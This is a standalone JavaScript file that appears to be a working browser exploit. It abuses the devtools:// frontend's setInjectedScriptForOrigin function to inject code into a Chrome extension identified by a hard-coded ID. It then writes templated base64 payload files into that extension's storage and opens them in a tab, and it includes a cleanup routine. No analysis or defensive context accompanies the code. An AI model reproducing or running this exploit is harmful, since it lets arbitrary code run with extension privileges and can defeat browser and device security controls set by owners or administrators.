(function () {
    if (!opener) {
        opener = window;
    }
    const w = window.opener.open("devtools://devtools/bundled/devtools_app.html");
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            let globalMap = [];
            function payload_swamp(w, d) {
                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function readFile(file) {
                        return new Promise((resolve) => {
                            fs.root.getFile(file, {}, (entry) => {
                                entry.file((file) => {
                                    file.text().then((value) => resolve(value))
                                }, (error) => {
                                    alert(error)
                                })
                            }, (error) => {
                                alert(error)
                            })
                        })
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    /*alert("hi")
                    alert(await readFile("manifest.json"))*/
                    await writeFile('index.js', atob(`%%EXTJS%%`))
                    const url = await writeFile('index.html', `${atob('%%EXTHTML%%')}<script src="./index.js"></script>`);
                    w.chrome.tabs.create({ url });
                    w.close();
                    cleanup();
                });
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                let path = 'manifest.json';
                let injected = payload ?? payload_swamp.toString();
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                }

            }
            dbgext(false, "gndmhdcefbhlchkhipcnnbkcmicncehk");
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
